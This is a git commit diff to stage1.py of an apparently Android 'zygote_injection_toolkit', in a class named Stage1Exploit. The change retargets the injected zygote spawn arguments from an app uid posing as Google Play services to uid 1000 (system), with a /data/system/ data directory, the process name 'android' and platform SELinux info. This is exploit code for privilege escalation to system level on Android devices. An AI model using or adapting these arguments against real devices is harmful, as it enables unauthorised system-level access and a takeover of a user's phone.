da32ed1ad5a51e26d95ea55413c80c75ea63b7b8
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-26 06:59:26 +0900

    Update zygote arguments for user and app data

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,13 +189,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10003",
-            "--setgid=10003",
+            "--setuid=1000",
+            "--setgid=1000",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/com.google.android.gms",
+            "--app-data-dir=/data/system/",
             "--runtime-args",
-            "--nice-name=com.google.android.gms",
+            "--nice-name=android",
             "--seinfo=platform:complete",
             "--runtime-flags=1",
             "--invoke-with",
